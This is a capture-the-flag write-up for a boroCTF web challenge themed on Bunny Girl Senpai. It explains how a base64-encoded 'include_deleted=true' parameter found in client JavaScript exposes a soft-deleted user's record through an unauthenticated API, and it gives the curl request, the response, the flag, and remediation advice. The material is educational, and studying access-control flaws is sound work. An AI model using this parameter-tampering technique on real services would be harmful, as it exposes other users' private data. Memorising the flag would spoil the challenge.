# boro-senpai 3 — IDOR & Soft-Deleted User Enumeration

**CTF:** boroCTF 2026
**Challenge:** boro-senpai 3
**Category:** Web
**Points:** 200

---

## Description

> Her AobaNet account — gone.
>
> Her name — scrubbed.
>
> But the internet doesn't actually delete things.
>
> Prove she existed.

The challenge presented a social networking site called **AobaNet**, themed around *Rascal Does Not Dream of Bunny Girl Senpai*.

The objective was to recover information about a user whose account had supposedly been deleted.

---

## Initial Reconnaissance

Browsing the website revealed several interesting details.

The HTML contained CSS classes related to suspended accounts:

```html
.an-friend-suspended
.an-suspended-badge
```

This immediately suggested that deleted or suspended profiles might still exist somewhere within the application.

The challenge description provided another important clue:

> was an actress

For anyone familiar with the series, this strongly points toward:

```text
Mai Sakurajima
```

A famous actress whose existence gradually became ignored by society due to Adolescence Syndrome.

The theme aligned perfectly with the challenge narrative.

---

## Inspecting JavaScript

The next step was reviewing the client-side JavaScript:

```bash
curl -s https://5l24ruh9miuo.boroctf.com/static/main.js
```

Inside the script:

```javascript
var url =
  API_BASE +
  encodeURIComponent(username) +
  '?' +
  window._modFlags.k +
  '=' +
  window._modFlags.v;
```

Further inspection revealed:

```javascript
window._modFlags.k = "aW5jbHVkZV9kZWxldGVk";
window._modFlags.v = "dHJ1ZQ==";
```

Decoding the values:

```text
aW5jbHVkZV9kZWxldGVk → include_deleted
dHJ1ZQ==             → true
```

Result:

```text
include_deleted=true
```

This appeared to be an internal moderator feature that allowed deleted accounts to be retrieved.

---

## Discovering the API

The JavaScript also exposed the API structure:

```text
/api/user/<username>
```

Combining this with the hidden moderator flag produced:

```text
/api/user/mai-sakurajima?include_deleted=true
```

---

## Exploitation

Request:

```bash
curl -s \
"https://5l24ruh9miuo.boroctf.com/api/user/mai-sakurajima?include_deleted=true"
```

Response:

```json
{
  "status":"deleted",
  "username":"mai-sakurajima",
  "display_name":"___________ / ___________",
  "mod_notes":"... boroCTF{th@nk_y0u_y0u_d!d_w3ll_!_l0v3_y0U<3}"
}
```

The API returned a soft-deleted account that was hidden from normal users.

More importantly, the flag was embedded inside the moderation notes.

---

## Why This Worked

The application attempted to hide deleted users from public search results.

However, it still exposed an undocumented parameter:

```text
include_deleted=true
```

The backend trusted the parameter without verifying whether the requester had moderator privileges.

As a result, any user could access records that should only have been visible to administrators.

This is a classic example of:

```text
Broken Access Control
```

combined with

```text
Insecure Direct Object Reference (IDOR)
```

---

## Attack Flow

```text
Browse Website
        ↓
Inspect JavaScript
        ↓
Discover Hidden Moderator Flag
        ↓
Decode Base64 Values
        ↓
include_deleted=true
        ↓
Enumerate Deleted User
        ↓
Retrieve Hidden Profile
        ↓
Read Moderator Notes
        ↓
Flag
```

---

## Flag

```text
boroCTF{th@nk_y0u_y0u_d!d_w3ll_!_l0v3_y0U<3}
```

---

## Root Cause

The backend exposed privileged functionality through a client-controlled parameter:

```text
include_deleted=true
```

No authorization checks were performed before returning deleted account data.

A secure implementation would verify that the requesting user possesses moderator permissions before exposing soft-deleted records.

---

## Remediation

Example:

```python
@app.route("/api/user/<username>")
def user(username):

    include_deleted = request.args.get("include_deleted")

    if include_deleted and not current_user.is_moderator:
        abort(403)

    return get_user(username)
```

Additionally:

* Never expose moderator features in client-side JavaScript.
* Avoid trusting hidden parameters.
* Enforce authorization on the server side.
* Treat deleted records as sensitive data.

---

## Lessons Learned

* JavaScript often reveals hidden application functionality.
* Base64 encoding is not a security mechanism.
* Soft-deleted records frequently contain sensitive information.
* Hidden parameters should never replace authorization checks.
* Enumeration combined with IDOR can expose data thought to be deleted.

---

## Tools Used

* Browser DevTools
* curl
* base64
* Manual API testing

---

## Takeaway

This challenge combined OSINT-style reasoning with web exploitation.

The anime reference pointed toward **Mai Sakurajima**, while JavaScript analysis revealed a hidden moderator parameter that exposed soft-deleted accounts. By abusing that functionality, it was possible to retrieve a deleted profile and recover the flag from internal moderation notes.

